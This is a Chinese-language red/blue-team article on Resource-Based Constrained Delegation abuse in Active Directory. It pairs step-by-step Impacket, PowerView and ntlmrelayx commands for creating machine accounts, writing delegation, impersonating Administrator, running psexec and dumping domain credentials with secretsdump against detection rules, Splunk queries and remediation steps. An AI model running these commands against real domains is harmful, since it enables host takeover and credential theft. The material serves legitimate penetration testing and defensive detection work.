---
title: "资源基础约束委派(RBCD)攻击链与检测处置"
weight: 35
---

# 资源基础约束委派(RBCD)攻击链与检测处置

`Resource-Based Constrained Delegation`，即 `RBCD`，是 Active Directory 后渗透阶段最稳定的横向移动技术之一。它的本质不是“爆破域管密码”，而是把对象控制权转化为 Kerberos 代理能力。只要攻击者能够让目标计算机对象信任自己控制的服务主体，就可以代表任意用户向目标服务申请合法票据，并以该用户权限访问目标主机。

这类攻击在真实环境中经常出现于以下几种场景：

- 普通域用户默认可以创建机器账户
- 某业务组对服务器计算机对象存在 `GenericWrite`、`WriteDacl` 或 `GenericAll`
- `NTLM Relay` 可以被用来替目标主机配置 `RBCD`
- 蓝队只监控登录事件，不监控目录对象属性修改和 `S4U` 票据流

本文按实战链路重写，重点放在三件事：

1. 攻击者实际如何把 `RBCD` 打通
2. 常见利用链会留下哪些事件痕迹
3. 蓝队如何从目录属性、Kerberos 票据和目标主机访问行为三层联动调查

---

## 0. 攻击面概览

### 0.1 RBCD 到底控制的是什么

传统约束委派关注的是“前端服务可以代理到哪些后端服务”，而 `RBCD` 反过来让目标资源自己维护信任列表。这个信任列表就保存在目标对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 中。攻击者一旦能写这个属性，就能把自己控制的主体加入目标的“可代表他人访问我”的名单中。

从攻击者角度看，这个机制最有价值的地方在于：

- 修改的是目录对象，不是目标系统本地注册表或文件
- 成功后拿到的是 KDC 正式签发的票据，不是伪造票据
- 行为常常落在 `Kerberos` 和目录变更层，很多环境对这两层的联动监控不足

### 0.2 攻击收益的实际边界

`RBCD` 的产出是“以某用户身份访问某服务”的服务票据，因此收益取决于两个变量：

1. 被模拟的用户在目标主机上的权限
2. 被请求的服务类型

例如同样是成功的 `RBCD`：

- 请求 `cifs/file01`，往往意味着可以直接访问共享、落地工具、配合 `psexec`
- 请求 `ldap/dc01`，则可能进入目录操作和更高价值的横向阶段
- 请求 `http/host`，可能适合 `WinRM` 或 Web 管理平面

所以红队不会盲目固定只打 `Administrator + cifs`，而是会根据目标服务面来选 `SPN`。

### 0.3 公开研究里真正重要的几个结论

围绕 `RBCD` 的公开资料很多，但对实战最关键的结论可以压缩成几条：

- Elad Shamir 的研究说明了 `RBCD` 不要求传统约束委派那种前置配置，且 `S4U2Proxy` 在 `RBCD` 中可被用来完成最终代理。
- harmj0y 的案例把这件事翻译成了更直白的红队语言：如果你能修改一台计算机对象，在现代域里通常就能接管这台机器本身。
- 多篇后续研究证明，`RBCD` 不是只能通过“原生 ACL 写权限”完成，还可以与 `NTLM Relay -> LDAP` 结合，让目标机器自己替攻击者完成授权配置。

也正因为如此，`RBCD` 不应该被当作一个独立知识点，而应该被视作域内“对象控制权 -> 身份代理能力”的标准转换器。

---

## 1. 先判断这条路能不能打

在域内拿到一个普通账户后，红队不会先背定义，而是快速判断 `RBCD` 是否满足落地条件。

### 1.1 必备条件

至少需要同时满足下面两项中的一项半到两项：

- 控制一个可用于服务认证的主体
- 能修改目标计算机对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity`

这里的“可用于服务认证的主体”通常有三种来源：

- 新建机器账户
- 已控制的机器账户
- 已控制且带有 `SPN` 的服务账户

最常见的是第一种。许多域仍保留默认 `MachineAccountQuota=10`，普通域用户即可创建机器账户。机器账户天然具备 `HOST/`、`CIFS/` 等 `SPN`，可直接参与 `S4U2Self` 和 `S4U2Proxy` 流程。

但这里有个容易被忽略的边界：

- 普通用户默认没有 `SPN`
- 没有 `SPN` 的普通路径下无法直接完成常见 `S4U2Self`
- 机器账户之所以常用，不是“必须是机器”，而是因为它天然满足 `SPN` 条件且创建门槛低

### 1.1.1 目标环境快速检查单

在正式走链前，建议红队先完成下面这组最小判断：

```powershell
Import-Module .\PowerView.ps1

# 域控版本/环境判断
Get-DomainController | Select-Object Name, OSVersion

# 机器账户配额
Get-DomainObject -Identity "DC=corp,DC=local" -Properties ms-ds-machineaccountquota

# 目标对象当前是否已有 RBCD
Get-DomainComputer FILE01 -Properties msds-allowedtoactonbehalfofotheridentity
```

如果目标对象本来就已经存在合法委派条目，后续处置和隐蔽性考虑会完全不同。红队需要确认自己是在追加，还是会覆盖原有配置。

### 1.2 红队最关心的枚举点

拿到低权限账户后，优先看三类信息：

```powershell
Import-Module .\PowerView.ps1

# 1. 查 MachineAccountQuota
Get-DomainObject -Identity "DC=corp,DC=local" -Properties ms-ds-machineaccountquota

# 2. 枚举对计算机对象的写权限
Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|WriteDacl|GenericAll|WriteProperty"
  } |
  Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier
```

如果用 BloodHound，重点不是“路径长不长”，而是：

- 当前用户是否拥有 `AddComputer`
- 当前用户或其组是否能写某台服务器对象
- 被写对象是否是跳板机、文件服务器、证书服务器、管理节点或域控

补充一类在项目里非常常见但经常被忽视的路径：

- `WriteAccountRestrictions`

某些环境会预先创建计算机对象，再把后续加域或交付权限交给项目组、桌面运维或实施人员。这个权限不一定看起来像“全控”，但足以触达关键属性集，最终同样能变成 `RBCD`。

### 1.2.1 哪些 ACL 看到就该立刻上心

对计算机对象来说，下面几类边在 BloodHound 或 ACL 枚举中都值得重点标红：

- `GenericAll`
- `GenericWrite`
- `WriteDacl`
- `WriteOwner`
- `Owns`
- `WriteAccountRestrictions`
- `AllowedToAct`

这些权限的攻击含义并不完全一样：

- `GenericWrite` / `GenericAll`
  通常能直接落到写属性
- `WriteDacl`
  先给自己补权限，再写属性
- `WriteOwner`
  先夺对象所有权，再改 `DACL`
- `AllowedToAct`
  往往意味着目标对象已经存在现成的 `RBCD` 条目，甚至可直接利用

### 1.3 票据层面真正发生了什么

很多文章把 `RBCD` 写成“修改属性后拿管理员权限”，实际并不准确。`RBCD` 的产出不是管理员密码，而是一张合法的服务票据。

完整流程通常是：

1. 攻击者控制一个服务主体
2. 把该主体写入目标对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity`
3. 使用该主体向 KDC 发起 `S4U2Self`
4. 再发起 `S4U2Proxy`
5. 获得面向目标服务的 `TGS`

最终效果是：攻击者不需要知道 `Administrator` 的密码，也可以拿到一张“代表 `Administrator` 访问 `cifs/file01.corp.local`”的票据。

这里的关键不是“冒充管理员本人做所有事”，而是“拿到管理员访问某个目标服务的那一张票据”。因此利用成功后，攻击者后续到底能不能直接 `psexec`、`wmiexec` 或 `secretsdump`，取决于：

- 目标服务是否支持对应操作
- 被模拟用户是否对目标主机有足够权限
- 访问时是否正确使用主机名/FQDN 而不是 IP

---

## 1.4 选目标时的优先级

很多新手一看到 `RBCD` 就只盯域控，但项目里更高效的顺序通常是：

1. 运维跳板机、堡垒机、管理机
2. 文件服务器、备份服务器
3. 证书服务、自动化发布节点、监控节点
4. 域控

原因是：

- 这些机器更容易从“服务票据”过渡到“高价值凭据”
- 一旦落地，能为下一跳提供更多本地管理员凭据、计划任务、RDP/WinRM、证书或运维令牌
- 直接打域控的日志压力和告警概率更高

因此 `RBCD` 的最佳利用姿势往往不是“立刻打 DC”，而是用它做一跳精确 takeover。

---

## 2. 利用链一：ACL 写入 RBCD

这是渗透测试里最典型、最稳定的一条链。公开资料、实战博客和常见工具都围绕这条路径展开。

### 2.1 场景设定

假设当前已获得普通域用户 `lowpriv`，并发现：

- 域默认允许创建机器账户
- `lowpriv` 对 `FILE01$` 计算机对象具备写权限

此时就可以直接走标准 `RBCD` 链。

这个场景也是 harmj0y 计算机接管案例的核心思路：如果一个低权限主体对某计算机对象具备足够的对象写权限，那就意味着这台机器本身已经可以被接管。

### 2.1.1 开始前建议做的校验

真正动手前最好多做两步，不然很容易把环境状态搞乱：

```bash
# 读取目标当前 RBCD 配置
rbcd.py -delegate-to 'FILE01$' -action read -dc-ip 10.10.10.10 \
  'corp.local/lowpriv:Password123!'
```

以及：

```powershell
Get-ADUser Administrator -Properties AccountNotDelegated,MemberOf
```

如果你准备用某个非内置管理员做 impersonation，要先确认他没有被标记为“敏感且不能被委派”。

### 2.2 第一步：创建攻击者控制的机器账户

Linux 下常用 `Impacket`：

```bash
addcomputer.py 'corp.local/lowpriv:Password123!' \
  -dc-ip 10.10.10.10 \
  -computer-name 'RBCD-SVC$' \
  -computer-pass 'Str0ngPass!123'
```

Windows 下常用 `PowerMad`：

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount "RBCD-SVC" `
  -Password $(ConvertTo-SecureString 'Str0ngPass!123' -AsPlainText -Force)
```

这里要记住三个值：

- 机器账户名
- 机器账户密码
- 对应 SID

后续写入属性本质上是把这个机器主体的 SID 写到目标对象的安全描述符里。

从取证角度看，这一步往往会在域控上留下 `4741`，并且新机器对象的创建者会成为后续事件链里的关键关联点。因此蓝队排查时不能把新机器账户当作孤立事件看。

如果要进一步确认创建状态，可以直接查：

```powershell
Get-ADComputer RBCD-SVC -Properties ServicePrincipalName,objectSid
```

或 Linux 下查 LDAP：

```bash
ldapsearch -x -H ldap://10.10.10.10 \
  -D 'corp.local\\lowpriv' -w 'Password123!' \
  -b 'DC=corp,DC=local' '(sAMAccountName=RBCD-SVC$)' \
  dn objectSid servicePrincipalName
```

### 2.3 第二步：给目标主机配置 RBCD

Linux/Impacket：

```bash
rbcd.py \
  -delegate-from 'RBCD-SVC$' \
  -delegate-to 'FILE01$' \
  -action write \
  -dc-ip 10.10.10.10 \
  'corp.local/lowpriv:Password123!'
```

Windows/PowerView：

```powershell
Set-DomainRBCD -Identity FILE01 -DelegateFrom 'RBCD-SVC$'
```

写入成功后，`FILE01$` 就被配置为信任 `RBCD-SVC$` 代表其他用户访问自己。

写入后建议立即二次读取，而不是直接跳票据申请：

```bash
rbcd.py \
  -delegate-to 'FILE01$' \
  -action read \
  -dc-ip 10.10.10.10 \
  'corp.local/lowpriv:Password123!'
```

因为在真实环境中，最容易出错的地方之一不是 `getST.py`，而是根本没有成功写进目标对象。

### 2.4 第三步：请求目标用户的服务票据

这一步才是真正的权限转换动作。常见目标服务优先选：

- `cifs/host`：适合 `SMB`、`psexec`、共享访问
- `host/host`：可覆盖部分本机服务访问
- `ldap/dc`：适用于更高价值的目录操作
- `http/host`：适用于 WinRM/IIS 场景

最经典的请求方式：

```bash
getST.py \
  -spn cifs/file01.corp.local \
  -impersonate Administrator \
  -dc-ip 10.10.10.10 \
  'corp.local/RBCD-SVC$:Str0ngPass!123'
```

输出通常是 `Administrator.ccache`。

这里再补一个实战判断：

- `cifs/host` 最适合做共享访问、`psexec`、远程命令落地
- `host/host` 有时可覆盖更多系统服务
- `ldap/dc` 更适合目录相关高价值动作
- `http/host` 往往服务于 `WinRM` 或 IIS/管理门户场景

也就是说，票据申请的 `SPN` 不是随便填的，而应反推你下一步准备怎么横向。

### 2.5 第四步：拿着票据打目标主机

```bash
export KRB5CCNAME=Administrator.ccache

impacket-psexec -k -no-pass corp.local/administrator@file01.corp.local
```

或者：

```bash
export KRB5CCNAME=Administrator.ccache

secretsdump.py -k -no-pass \
  corp.local/administrator@file01.corp.local \
  -target-ip 10.10.10.21
```

如果目标是成员服务器，通常意味着本机接管。
如果目标是域控，风险会立刻抬升到：

- 目录导出
- 凭据同步
- 域级持久化

如果目标是域控，典型后续动作通常会进一步切换成：

```bash
export KRB5CCNAME=Administrator.ccache

secretsdump.py -k -no-pass \
  corp.local/administrator@dc01.corp.local \
  -just-dc
```

但从 OPSEC 角度看，这类动作会明显提高暴露概率，因此实际演练中常先验证 `cifs` 可用性，再决定是否继续做目录级操作。

### 2.6 这条链最容易失败的地方

不要把 `RBCD` 误认为“必成攻击”。实战中常见失败点包括：

- 目标账户被标记为“敏感且不能被委派”
- 目标服务选错，导致即使拿到票据也无法执行预期操作
- `MachineAccountQuota=0`
- 当前账号对目标对象并不真的有写入关键属性的权限
- 名称解析错误，导致后续使用 `Kerberos` 票据访问失败

实战里最常见的一个坑是：票据请求成功了，但后续直接用 IP 访问目标，导致 `SPN` 不匹配。`Kerberos` 场景下优先使用主机名或 FQDN，不要直接拿 IP 当目标。

还有几个常见失败点需要额外强调：

- 新建机器账户成功，但 DNS/FQDN 解析不通，后续票据难以正确使用
- 工具默认写入或读取 LDAP 失败，被误判成权限问题
- 目标主机虽然被接管，但真正想模拟的用户对这台主机本地并无管理员权限
- 访问服务选错，例如明明准备 `WinRM`，却只申请了不适合后续流程的服务票据

---

## 3. 利用链二：NTLM Relay 设置 RBCD

这一条链比单纯 ACL 滥用更危险，因为它把“原本没有对象写权限”的问题，转化成了“是否能把认证中继到 LDAP”。

### 3.1 基本思路

典型组合打法如下：

1. 先准备一个攻击者控制的机器账户
2. 诱导或强制目标机器向攻击者发起 NTLM 认证
3. 用 `ntlmrelayx` 把这次认证中继到 `LDAP/LDAPS`
4. 让 `ntlmrelayx` 直接给目标对象设置 `RBCD`
5. 再用 `getST.py` 代表高权限用户申请票据

这也是很多公开案例里最有实战味道的一条链，因为它不要求当前低权限账户本来就能修改目标对象。

这条链的真正危险点在于：攻击者把“能写对象”这个问题转移成了“能不能让目标替我完成认证，然后我把它中继到 LDAP”。只要这一步成立，原本看起来没有直接 ACL 的路径，也可能被打通。

### 3.2 常见触发手法

公开资料和实战复现里最常见的触发来源有：

- `PetitPotam`
- `PrinterBug`
- `WebClient/WebDAV`
- 机器账户自身 NTLM 认证被中继

如果环境没有做完善签名和绑定保护，这类链可以直接把某台机器“拉进”攻击者构造的 `RBCD` 授权关系里。

Praetorian 和 Logan Goins 的公开研究都强调了几个经常被忽略的前提：

- 域控若强制 `LDAP Signing` / `Channel Binding`，链路可行性会明显下降
- `WebClient` 是否运行会直接影响部分 HTTP 诱导路径
- 代理链、SOCKS 转发和流量回流能力，经常比命令本身更决定能否打通

### 3.3 常见工具组合

准备机器账户：

```bash
addcomputer.py 'corp.local/lowpriv:Password123!' \
  -dc-ip 10.10.10.10 \
  -computer-name 'BAUD$' \
  -computer-pass 'BaudPass!123'
```

然后用中继工具将受害主机认证中继到 `LDAP/LDAPS`，并设置委派访问。不同版本工具参数略有差异，常见思路是：

- 指定中继目标为 `ldaps://dc01.corp.local`
- 打开 `--delegate-access`
- 指定要提升的机器账户 `BAUD$`

中继设置完成后，再使用标准 `getST.py`：

```bash
getST.py \
  -spn cifs/target.corp.local \
  -impersonate Administrator \
  -dc-ip 10.10.10.10 \
  'corp.local/BAUD$:BaudPass!123'
```

如果直接使用 `ntlmrelayx.py`，常见命令形式如下：

```bash
ntlmrelayx.py -t ldaps://10.10.10.10 \
  -smb2support \
  --delegate-access \
  --escalate-user 'BAUD$' \
  --no-dump --no-da --no-acl --no-validate-privs
```

需要注意的是，跨域场景下有时不能只给 `--escalate-user` 传名字，而要传 SID。Synacktiv 在 2026 年的跨域 `RBCD` 研究里就专门提到了这一点，因为外域主体不一定能被目标域 LDAP 直接按名称解析。

### 3.4 为什么蓝队容易漏掉这条链

因为很多监控规则会把“认证中继”和“Kerberos 票据异常”分开看。实际上一条完整攻击链会同时跨越：

- NTLM 网络认证
- LDAP 对象写入
- Kerberos `S4U`
- 目标主机侧访问

如果只看 `4624` 或只看 `4769`，很容易漏掉完整上下文。

更准确地说，这条链往往跨越了四个检测域：

- 认证诱导
- 网络中继
- LDAP 写入
- Kerberos 票据使用

任何一层单独看都可能像“普通运维行为”或“局部异常”，只有合在一起才像完整攻击链。

---

## 4. 更高级但更少见的变体

### 4.1 SPN-less RBCD

近年的公开研究已经证明，`RBCD` 并不永远强依赖“攻击者必须控制一个带 SPN 的服务账户”。某些场景下可以利用 `U2U` 相关技巧实现 `SPN-less RBCD`，即使 `MachineAccountQuota=0` 也可能找到绕行路径。

但这类方法实战成本更高，环境约束更多，而且可能影响被利用账户正常使用。对于常规渗透测试，优先级仍然低于“新建机器账户 + 标准 S4U”。

换句话说，`SPN-less RBCD` 更像是“当标准路线被 `MachineAccountQuota=0` 卡死时的备用方案”，而不是大多数项目里的主流路线。

### 4.2 跨域与跨林场景

部分公开资料已经讨论跨域 `RBCD` 的细节问题，例如：

- 委派条目可能需要直接使用 SID
- Linux 工具链默认流程不一定能正确处理跨域 `S4U`
- 被模拟用户通常要与攻击者控制主体处于兼容的信任范围内

因此跨域 `RBCD` 不是“工具一把梭”，而是需要先确认信任关系、域边界和 KDC 行为。

这部分是很多文章写得最少、但真实复杂度最高的地方。Synacktiv 的研究表明，跨域 `RBCD` 常常需要：

- 先拿本域 `TGT`
- 再拿 referral TGT
- 再完成跨域 `S4U2Self`
- 最后完成 `S4U2Proxy`

因此在跨域场景下，现成工具链未必百分百可用，很多时候需要更熟悉 `Kerberos` 报文流程，甚至参考 `Rubeus` 的实现去理解多跳票据交换逻辑。

### 4.3 与 AD CS 的联动

这是很值得单独关注的组合点。若环境中还存在 `AD CS` 配置缺陷，例如可通过证书拿到 `LDAP` 高权限访问能力，则攻击链可能演化为：

1. 先通过证书拿下 LDAP 操作能力
2. 再对目标对象配置 `RBCD`
3. 最后以高权限用户身份申请目标服务票据

也就是说，`RBCD` 在很多时候不是入口，而是攻击链中的“身份转换器”。

---

## 5. 蓝队检测：不要只盯登录日志

`RBCD` 并不隐形。真正难的是，关键痕迹分散在不同日志里。要想查清楚，必须把目录属性修改、机器账户创建、`S4U` 票据申请和目标主机访问串成时间线。

### 5.0 先确认日志是否真的采集了

很多团队说“我们查不到 RBCD”，其实不是攻击没痕迹，而是压根没开或没转发对应日志。最少应确认：

- 域控上的 `Security` 日志已完整采集
- `Audit Directory Service Changes` 已启用
- `Audit Kerberos Service Ticket Operations` 已启用
- `Audit Computer Account Management` 已启用
- 目标主机的 `4624`、`5140`、`7045`、`4698` 等已转发或可回收

如果这些前置条件缺失，后面的狩猎规则再漂亮也跑不出来。

### 5.1 Event ID 5136：目录对象被修改

最关键的日志是域控上的 `5136`。排查重点不是“有没有对象被改”，而是：

- LDAP Display Name 是否为 `msDS-AllowedToActOnBehalfOfOtherIdentity`
- Subject 是谁
- Object 被改的是哪台机器
- Subject 是否是低权限用户、异常服务账户或新机器账户

一个非常高价值的判断条件是：

- 修改者不是正常运维账户
- 被修改对象却是高价值服务器或域控

简化筛选示例：

```powershell
Get-WinEvent -LogName Security |
  Where-Object {
    $_.Id -eq 5136 -and
    $_.Message -like "*msDS-AllowedToActOnBehalfOfOtherIdentity*"
  }
```

如果日志平台支持字段抽取，建议重点解析：

- `ObjectDN`
- `AttributeLDAPDisplayName`
- `SubjectUserName`
- `AttributeValue`

这会让你后续把 `5136` 与 `4741`、`4769` 做关联时精度高很多。

### 5.2 Event ID 4741：新机器账户创建

如果攻击者走的是默认 `MachineAccountQuota` 路线，通常会在域控上留下 `4741`。

这一事件单独看并不一定恶意，但结合上下文价值极高：

- 创建者是普通用户而不是加域流程账号
- 新机器名称不符合命名规范
- 该机器在创建后几分钟内立刻出现在 `4769` 的 `S4U` 票据流里

蓝队应避免把 `4741` 当作低优先级噪音直接忽略。

一个非常有价值的关联方式是：

- 先锁定异常 `4741`
- 记下新机器名和创建者
- 再看这个创建者是否很快修改了某台服务器对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity`
- 再看该机器账户是否很快出现在 `4769`

### 5.3 Event ID 4769：S4U2Self 与 S4U2Proxy

这是 `RBCD` 最具行为特征的部分。

`S4U2Self` 的常见检测思路：

- `Account Name` 与 `Service Name` 指向相同主体
- 票据请求主体往往是机器账户或带 `SPN` 的服务账户

`S4U2Proxy` 的常见检测思路：

- `Transited Services` 非空
- 紧接着出现面向目标服务的 `TGS` 请求
- 请求主体不是日常委派设备，却在请求高价值目标服务

公开检测文章普遍建议把下面四类动作关联起来看：

1. `4741` 新机器账户创建
2. `5136` 修改 `msDS-AllowedToActOnBehalfOfOtherIdentity`
3. 第一条 `4769`：`S4U2Self`
4. 第二条 `4769`：`S4U2Proxy`

如果四步在较短时间窗口内串起来，基本就是高置信度 `RBCD` 利用链。

swolfsec 的公开分析还特别提到了两个字段层特征：

- `S4U2Self` 场景里，`Account Name` 和 `Service Name` 会指向同一主体
- `S4U2Proxy` 场景里，`Transited Services` 往往非空

此外，`S4U2Self` 常见 `TicketOptions` 可见 `0x40800018` 这类值。单独拿它做强检测未必稳，但作为调查辅助字段很有价值。

### 5.4 目标主机侧的二次痕迹

`RBCD` 本身只负责拿票据，不负责最终入侵动作。真正的后续危害往往体现在目标主机上：

- `4624` 网络登录
- `5140` 共享访问
- `7045` 新服务安装
- `4698` 计划任务创建
- `Sysmon Event ID 1` 可疑进程启动

所以一旦域控侧发现可疑 `4769`，蓝队必须立刻把排查扩展到目标主机：

- 是否紧接着出现来自异常源主机的 `Kerberos` 登录
- 是否有 `SMB`、`PsExec`、`WinRM`、`WMI` 访问行为
- 是否出现凭据转储、远程服务创建或任务投递

### 5.5 可直接落地的狩猎思路

PowerShell 粗筛：

```powershell
# RBCD 属性修改
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5136} |
  Where-Object {$_.Message -like "*msDS-AllowedToActOnBehalfOfOtherIdentity*"}

# 新机器账户创建
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4741}

# 可疑 S4U 票据
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} |
  Where-Object {
    $_.Message -like "*Transited Services*" -or
    $_.Message -like "*Service Name:*$*"
  }
```

Splunk 方向建议至少拆成三条基础搜索，再做时间窗关联：

```spl
index=wineventlog_security EventCode=5136 AttributeLDAPDisplayName="msDS-AllowedToActOnBehalfOfOtherIdentity"
| stats values(ObjectDN) as object values(SubjectUserName) as actor min(_time) as firstTime max(_time) as lastTime by Computer
```

```spl
index=wineventlog_security EventCode=4741
| stats values(TargetUserName) as newComputer values(SubjectUserName) as creator by Computer _time
```

```spl
index=wineventlog_security EventCode=4769
| stats values(ServiceName) as service values(TargetUserName) as account values(TransitedServices) as transited by Computer _time
```

真正高置信度的规则，不是某一条单独命中，而是三类事件被同一批对象、用户和时间窗串起来。

### 5.6 合法使用与误报边界

不能简单把所有 `RBCD` 相关事件都等同恶意。在某些少数业务环境里，委派确实被合法使用。但这类合法场景通常具备几个稳定特征：

- 固定的少数服务器参与
- 固定的服务账户参与
- 属性修改极少发生
- 委派链长期不变

因此对蓝队来说，最重要的不是“知道这个名词”，而是建立基线：

- 哪些对象平时有合法 `RBCD`
- 哪些账户平时会改这个属性
- 哪些机器平时会出现 `S4U2Self/S4U2Proxy`

偏离基线的事件，才应进入高优先级处置。

---

## 6. 调查流程：按时间线还原

发现疑似 `RBCD` 后，不要只删属性。正确做法是按链路回放。

### 6.1 第一阶段：确认谁改了谁

先围绕 `5136` 拿到这几个关键字段：

- Subject Account
- Object DN
- 被修改属性名
- 时间戳

这一步的目标是确认：

- 谁改了 `RBCD`
- 改到了哪台机器上

调查时建议同时把这两件事一并问清：

- 这是首次修改，还是历史上已有委派关系
- 修改者是否本来就应当接触该高价值对象

### 6.2 第二阶段：确认攻击者控制了哪个主体

再检查是否存在：

- 新机器账户创建 `4741`
- 相关机器账户的后续 `4769`
- 机器账户或服务账户异常活跃

这里常能定位出攻击者控制的中间主体，例如 `RBCD-SVC$` 或随机新建机器名。

如果定位到了新机器账户，不要只停留在“删掉它”。还要回看：

- 该机器是谁创建的
- 创建后多久开始出现在 `4769`
- 是否还被用于别的服务票据流程

### 6.3 第三阶段：确认最终访问落到哪里

再把时间线扩展到目标主机：

- 看 `4624` 是否出现异常源
- 看 `5140`、`7045`、`4698`
- 看是否有 `secretsdump`、`psexec`、`wmiexec` 一类动作的落地痕迹

如果目标是域控，还要额外检查：

- 是否发生 `DCSync`
- 是否出现新的高权限对象修改
- 是否产生新的持久化手段

### 6.4 第四阶段：向前回溯入口

如果怀疑是 `Relay -> RBCD` 路线，处置不能只停留在 AD 侧。还要往前倒查：

- 是否存在认证诱导行为
- 是否存在异常 HTTP/SMB/LDAP 中继路径
- 是否有 WebDAV、打印机、EFSRPC 等相关触发痕迹
- 攻击机到域控的网络路径是否支持中继落地

这一步的意义在于：确认攻击者是“本来就有对象写权限”，还是“临时通过中继链拿到了写权限”。两种情况的修复重点完全不同。

---

## 7. 处置与加固

### 7.1 立即处置

如果已确认被利用，优先动作应是：

- 清理目标对象上的 `msDS-AllowedToActOnBehalfOfOtherIdentity`
- 禁用或删除攻击者创建的机器账户
- 重置相关机器账户密码或执行重新入域
- 检查目标主机是否已被拿下并做应急隔离

如果目标是域控或管理节点，还应进一步考虑：

- 重置被模拟高权限账户凭据
- 检查是否已导出目录数据或本地凭据
- 评估是否已有二次持久化，比如计划任务、服务、登录脚本、证书滥用或新对象 ACL

### 7.2 长期加固

对 `RBCD` 有效的基础防护并不复杂，但很多环境长期没做：

- 将 `MachineAccountQuota` 调整为 `0`
- 清理普通用户或业务组对服务器对象的写权限
- 给高价值账户设置“敏感且不能被委派”
- 强制 `LDAP Signing`
- 结合环境启用 `SMB Signing` 与中继防护
- 对 `5136` 中关键委派属性修改建立实时告警
- 对 `4769` 中 `S4U2Self + S4U2Proxy` 组合建立关联规则

如果短期无法彻底完成所有反中继改造，至少也要优先落实两件事：

- 将 `MachineAccountQuota` 改为 `0`
- 对 `msDS-AllowedToActOnBehalfOfOtherIdentity` 的修改建立专门高优先级审计

### 7.3 蓝队容易误判的点

几个常见误区：

- 只把 `5136` 当成“AD 运维操作”
- 只看 `4624`，忽略 `4769`
- 看到新机器账户创建但不关联后续票据行为
- 删除 `RBCD` 属性后就结束调查，忽略目标主机可能已被接管

---

## 8. 复盘清单

如果把这篇文章落到真实项目中，最有价值的不是概念，而是复盘时有没有一张能直接对照的清单。

### 8.1 红队侧最小判断集

- 域里是否允许创建机器账户
- 当前主体是否已有 `SPN`
- 当前主体能否改目标对象的关键属性或 `DACL`
- 目标主机上有没有值得拿的后续权限和凭据
- 是否存在通过中继链把“无写权限”转化为“可写对象”的机会

### 8.2 蓝队侧最小判断集

- `5136`、`4741`、`4769` 是否已采集
- 是否能区分合法委派与异常新增委派
- 是否能把机器账户创建与后续票据行为串联
- 是否能从域控调查扩展到目标主机侧日志
- 是否已经识别出中继型入口还是 ACL 型入口

### 8.3 应急侧最小动作集

- 清理恶意 `RBCD`
- 禁用恶意机器账户
- 检查目标主机是否被横向
- 检查是否已发展为目录级或域级事件
- 修复对象权限和中继面，而不是只做表面删除

---

## 9. 总结

`RBCD` 之所以危险，不是因为概念复杂，而是因为它把很多环境里早就存在的普通问题组合成了一条完整攻击链：

- 默认允许创建机器账户
- 对计算机对象授权过宽
- 中继链未被有效阻断
- 目录修改和 Kerberos 票据行为未建立联动检测

从红队角度看，`RBCD` 是域内横向移动的高性价比通道。
从蓝队角度看，真正需要掌握的不是一句定义，而是能否在日志里连出完整序列：

- `4741`
- `5136`
- `4769`
- 目标主机侧访问事件

只要这条时间线能被稳定重建，`RBCD` 就不是不可见攻击。

---

## 参考资料

- [Shenanigans Labs: Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [harmj0y: A Case Study in Wagging the Dog - Computer Takeover](https://blog.harmj0y.net/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
- [The Hacker Recipes: RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
- [The Hacker Recipes: S4U2Self Abuse](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
- [swolfsec: Detecting Resource-Based Constrained Delegation Abuse](https://swolfsec.github.io/2023-11-29-Detecting-Resource-Based-Constrained-Delegation/)
- [tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)
- [HackTricks: Resource-based Constrained Delegation](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html)
- [Praetorian: RBCD Based Privilege Escalation - Part 2](https://www.praetorian.com/blog/red-team-privilege-escalation-rbcd-based-privilege-escalation-part-2/)
- [Logan Goins: NTLM Relaying to LDAP](http://logan-goins.com/2024-07-23-ldap-relay/)
- [Synacktiv: Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd)
